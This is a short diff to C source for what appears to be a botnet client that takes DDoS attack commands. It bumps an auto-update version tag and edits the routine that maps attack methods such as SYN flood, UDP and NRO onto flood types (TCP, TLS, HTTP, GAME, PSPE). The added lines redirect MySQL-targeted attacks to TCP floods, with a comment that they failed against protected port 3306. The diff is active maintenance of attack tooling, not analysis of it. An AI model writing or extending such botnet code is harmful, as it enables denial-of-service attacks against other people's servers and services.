@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.69"
+#define BOT_VERSION_TAG "v4.0.73"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -632,7 +632,7 @@ int main(int argc, char *argv[])
                     char *m = atk.method;
                     for (char *p = m; *p; p++)
                         if (*p >= 'a' && *p <= 'z') *p -= 32;
-                    /* 5 methods only: PSPE | TCP | TLS | HTTP | GAME */
+                    /* Methods: PSPE | TCP | TLS | HTTP | GAME */
                     if (!strcmp(m, "ACK") || !strcmp(m, "SYN") || !strcmp(m, "SYNFLOOD"))
                         strcpy(m, "TCP");
                     else if (!strcmp(m, "UDP") || !strcmp(m, "MEGA") || !strcmp(m, "PORT") || !strcmp(m, "SCAN"))
@@ -645,6 +645,9 @@ int main(int argc, char *argv[])
                         strcpy(m, "TLS");
                     else if (!strcmp(m, "NRO"))
                         strcpy(m, "GAME");
+                    /* MYSQL/SQL removed — ineffective against protected 3306 */
+                    else if (!strcmp(m, "MYSQL") || !strcmp(m, "SQL") || !strcmp(m, "MARIADB") || !strcmp(m, "MYSQLD"))
+                        strcpy(m, "TCP");
                     if (strcmp(m, "PSPE") && strcmp(m, "TCP") && strcmp(m, "TLS") &&
                         strcmp(m, "HTTP") && strcmp(m, "GAME")) {
                         if (foreground)
